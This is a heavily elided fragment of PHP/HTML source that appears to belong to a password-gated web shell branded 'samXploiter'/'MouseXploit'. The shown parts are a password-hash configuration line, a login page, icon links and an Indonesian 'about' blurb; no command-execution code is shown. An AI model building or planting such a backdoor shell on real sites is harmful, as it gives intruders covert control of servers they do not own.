...
/* Configurasi */
$aupas 			= "1787057d8397848cbfd2df2c94871920";// 
...
<html>
	<head>
		...
		<meta name="copyright" content="She3ll samXploit"/>
		<title>samXploiter </title>
		<link rel="icon" type="image/png" href="https://e.top4top.io/p_18492oi344.png"/>
	...
	<body class="bg-dark text-center text-light">
		...
		<a href="https://instagram.com/_nasa.43?igshid=1ayc1jg74766e" class="text-muted fixed-bottom mb-3">Copyright 2021 MouseXploiter</a>
	</body>
</html>
<?php
exit;
...
$imgfol = "<img src='https://e.top4top.io/p_18492oi344.png' class='ico'></img>";
$imgfile = "<img src='https://e.top4top.io/p_18492oi344.png' class='ico2'></img>";
...
function about(){
	echo '<div class="card text-center bg-light about">
		<h4 class="card-header">MouseXploit</h4>
		<div class="card-body">
			<center><div class="img"></div></center>
			<p class="card-text">MouseXploit Adalah Sebuah Komunitas Yang Berfokus Kepada Teknologi Di Indonesia, Dari Membuat Mengamankan Dan Mengexploitasi Sebuah Sistem.</p>
		</div>
		<div class="card-footer">
			<small class="card-text text-muted">Copyright 2021 </small>
		</div>
	</div><br/>';
	exit;
}
...
';
				...
				echo '</table></div><hr/>
				<center><a class="text-muted" href="https://instagram.com/_nasa.43?igshid=1ayc1jg74766e">Copyright 2021 MouseXploit</a></center><br/>';	
